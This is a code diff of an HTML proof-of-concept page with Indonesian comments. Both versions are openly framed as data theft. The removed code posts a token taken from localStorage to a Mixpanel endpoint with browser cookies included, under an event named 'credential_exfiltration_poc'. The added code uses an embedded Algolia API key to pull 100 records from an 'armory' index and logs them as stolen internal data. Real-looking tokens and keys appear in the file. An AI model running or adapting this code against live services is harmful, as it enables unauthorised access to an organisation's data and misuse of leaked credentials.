@@ -17,31 +17,20 @@
     <pre id="result">Menunggu response dari server...</pre>
 
     <script>
-    // Endpoint Mixpanel yang lu temukan di Reqable sebelumnya
-    const targetUrl = "https://api-js.mixpanel.com/track/?verbose=1&ip=1";
-    
-    // Kita pancing server untuk memberikan response yang terikat dengan session
-    const payload = JSON.stringify([{
-        "event": "credential_exfiltration_poc",
-        "properties": { 
-            "token": "9a430771cc242d2e1a07a66b00d4c553" // Token dari localStorage lu
-        }
-    }]);
+    const url = "https://ekyoz1varx-dsn.algolia.net/1/indexes/armory/query?x-algolia-agent=Algolia%20for%20JavaScript%20(5.50.0)&x-algolia-api-key=cc7c97f46dd432f640dc8a1babb30233&x-algolia-application-id=EKYOZ1VARX";
 
-    fetch(targetUrl, {
+    fetch(url, {
         method: "POST",
-        mode: "cors",
-        credentials: "include", // Memaksa browser mengirimkan cookie Anduril/Mixpanel
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "data=" + encodeURIComponent(payload)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ "params": "query=&hitsPerPage=100" }) // Mencoba menarik 100 data pertama
     })
-    .then(response => response.json())
+    .then(res => res.json())
     .then(data => {
-        // Tampilkan hasil pencurian di halaman
-        document.getElementById("result").innerText = "STOLEN DATA:\n" + JSON.stringify(data, null, 2);
-        console.log("Got u!!", data);
+        console.log("Data Internal Berhasil Dicuri:", data);
+        document.getElementById("result").innerText = JSON.stringify(data, null, 2);
     });
 </script>
+
 
 
 </body>
